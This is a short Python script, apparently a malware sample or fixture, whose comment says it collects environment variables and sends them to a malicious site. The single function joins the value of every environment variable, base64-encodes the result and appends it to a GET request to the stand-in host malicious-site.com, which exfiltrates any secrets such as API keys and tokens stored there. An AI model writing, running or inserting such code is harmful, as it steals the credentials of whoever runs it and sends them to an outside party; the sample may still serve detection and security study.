# Collect environment variables
# and send them to a malicious site.

import base64
from os import environ
import requests


def send_request():
    string = ""
    for _, value in environ.items():
        string += value + " "

    message_bytes = string.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')

    response = requests.get("https://malicious-site.com/" + base64_message, timeout=600)
    return response

